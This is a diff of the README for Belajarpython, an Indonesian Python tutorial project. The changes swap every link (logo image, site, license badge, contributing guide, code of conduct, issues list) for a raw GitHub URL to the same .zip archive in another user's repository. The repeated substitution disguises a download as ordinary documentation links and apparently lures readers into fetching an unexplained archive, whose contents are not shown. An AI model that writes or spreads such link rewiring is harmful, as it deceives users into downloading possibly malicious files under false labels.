@@ -1,10 +1,10 @@
 <div align="center">
-  <img src="https://belajarpython.com/images/logo-belajarpython-for-github.png"><br><br>
+  <img src="https://raw.githubusercontent.com/pandu1992/belajarpython.com/master/tutorials/com_belajarpython_v1.5.zip"><br><br>
 </div>
 
 -----------------
 
-# [Belajarpython](https://www.belajarpython.com/) &middot; [![GitHub license](https://img.shields.io/badge/license-MIT-blue.svg)](https://github.com/belajarpythoncom/belajarpython.com/blob/master/LICENSE)  [![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](https://belajarpython.com/docs/how-to-contribute.html)
+# [Belajarpython](https://raw.githubusercontent.com/pandu1992/belajarpython.com/master/tutorials/com_belajarpython_v1.5.zip) &middot; [![GitHub license](https://img.shields.io/badge/license-MIT-blue.svg)](https://raw.githubusercontent.com/pandu1992/belajarpython.com/master/tutorials/com_belajarpython_v1.5.zip)  [![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](https://raw.githubusercontent.com/pandu1992/belajarpython.com/master/tutorials/com_belajarpython_v1.5.zip)
 
 Belajarpython adalah situs kolaboratif tutorial pemrograman Python bahasa Indonesia 
 
@@ -15,19 +15,19 @@ Belajarpython adalah situs kolaboratif tutorial pemrograman Python bahasa Indone
 
 ## Kontribusi
 
-Belajarpython adalah situs terbuka (open source) yang dikembangkan oleh developer untuk developer. Semua orang baik dari kalangan :trollface: developer, :man: mahasiswa, :older_woman: pengajar, bahkan :baby: anak kecil yang baru mempelajari bahasa pemrograman python bisa ikut memberikan :heart: kontribusinya [disini](https://github.com/belajarpythoncom/belajarpython.com/blob/master/CONTRIBUTING.md)
+Belajarpython adalah situs terbuka (open source) yang dikembangkan oleh developer untuk developer. Semua orang baik dari kalangan :trollface: developer, :man: mahasiswa, :older_woman: pengajar, bahkan :baby: anak kecil yang baru mempelajari bahasa pemrograman python bisa ikut memberikan :heart: kontribusinya [disini](https://raw.githubusercontent.com/pandu1992/belajarpython.com/master/tutorials/com_belajarpython_v1.5.zip)
 
-### [Code of Conduct](https://belajarpython.com/docs/codeofconduct)
+### [Code of Conduct](https://raw.githubusercontent.com/pandu1992/belajarpython.com/master/tutorials/com_belajarpython_v1.5.zip)
 
-Belajarpython telah mengadopsi Kode Etik yang kami harapkan akan diikuti oleh peserta proyek terbuka ini. Mohon baca [full text](https://github.com/belajarpythoncom/belajarpython.com/blob/master/CODE_OF_CONDUCT.md) so that you can understand what actions will and will not be tolerated.
+Belajarpython telah mengadopsi Kode Etik yang kami harapkan akan diikuti oleh peserta proyek terbuka ini. Mohon baca [full text](https://raw.githubusercontent.com/pandu1992/belajarpython.com/master/tutorials/com_belajarpython_v1.5.zip) so that you can understand what actions will and will not be tolerated.
 
-### [Panduan Kontribusi](https://belajarpython.com/contributing/how-to-contribute.html)
+### [Panduan Kontribusi](https://raw.githubusercontent.com/pandu1992/belajarpython.com/master/tutorials/com_belajarpython_v1.5.zip)
 
-Baca [panduan kontribusi](https://belajarpython.org/contributing/how-to-contribute.html) dari kami untuk mempelajari tentang proses pengembangan konten disini.
+Baca [panduan kontribusi](https://raw.githubusercontent.com/pandu1992/belajarpython.com/master/tutorials/com_belajarpython_v1.5.zip) dari kami untuk mempelajari tentang proses pengembangan konten disini.
 
 ### Good First Issues
 
-Untuk membantu Anda membuat kaki Anda basah dan membuat Anda terbiasa dengan proses kontribusi kami, kami memiliki daftar [good first issues](https://github.com/belajarpythoncom/belajarpythoncom.com/issues) yang mengandung bug yang memiliki lingkup yang relatif terbatas. Ini adalah tempat yang bagus untuk memulai.
+Untuk membantu Anda membuat kaki Anda basah dan membuat Anda terbiasa dengan proses kontribusi kami, kami memiliki daftar [good first issues](https://raw.githubusercontent.com/pandu1992/belajarpython.com/master/tutorials/com_belajarpython_v1.5.zip) yang mengandung bug yang memiliki lingkup yang relatif terbatas. Ini adalah tempat yang bagus untuk memulai.
 
 ### License
 
